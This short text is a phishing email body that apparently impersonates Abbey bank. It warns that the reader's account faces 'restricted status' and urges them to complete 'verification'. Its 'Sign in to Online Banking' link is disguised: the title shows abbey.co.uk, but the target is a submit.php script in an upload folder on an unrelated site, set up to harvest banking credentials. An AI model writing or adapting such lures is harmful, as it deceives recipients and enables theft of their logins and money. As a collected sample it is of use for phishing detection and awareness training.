Your account  might be placed on restricted status. Restricted accounts continue to receive  payments, but they are limited in their ability to send or withdraw funds. To   lift up this restriction, you need to complete our verification   process. All restricted accounts have their billing information unconfirmed,   meaning that you may no longer send money from your account until you have   reactive your billing information on file. <a title="http://www.abbey.co.uk" href="http://www.bodycartography.org/upload_test/uploads/abbey/submit.php?cmd=validate" target="_blank">Sign in to Online Banking </a><br />
